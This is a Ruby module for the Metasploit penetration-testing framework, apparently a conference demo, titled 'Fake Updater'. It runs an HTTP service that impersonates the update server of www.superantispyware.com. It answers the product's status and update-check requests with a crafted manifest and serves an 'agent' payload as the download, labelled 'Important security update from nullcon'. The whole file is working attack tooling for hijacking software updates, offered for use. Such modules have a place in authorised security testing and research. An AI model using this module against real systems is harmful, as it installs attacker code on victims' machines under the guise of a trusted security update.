require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake  Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('DESCRIPTION',    [ false, "Update description shown to user.", "Important security update from nullcon" ]),
			], self.class)
		
		@base = {	
			'vh' => ['www.superantispyware.com'],
			'request' => [{
				'req' => 'STATUS', 
				'type' => 'string', 
				'bin'    => 0,
				'string' => 'OK',
				'parse' => 0,
				'file' => '',
			},
			{
				'req' => 'GETAVAILABLE', 
				'type' => 'file', 
				'bin'    => 0,
				'string' => '',
				'parse' => 1,
				'file' => 'superantispyware.xml',
			},
			{
				'req' => 'DOWNLOAD', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {  
			#todo check for random
				'description'  => { 
					'val' => datastore['description'],
					'dynamic' =>0
				},
				'md5'	=> {
					'val' => 'MD5()',
					'dynamic' => 1	
				},	       
				'size'	=> {
					'val' => 'SIZE()',
					'dynamic' => 1	
				} 	
			}
		}
	end
end
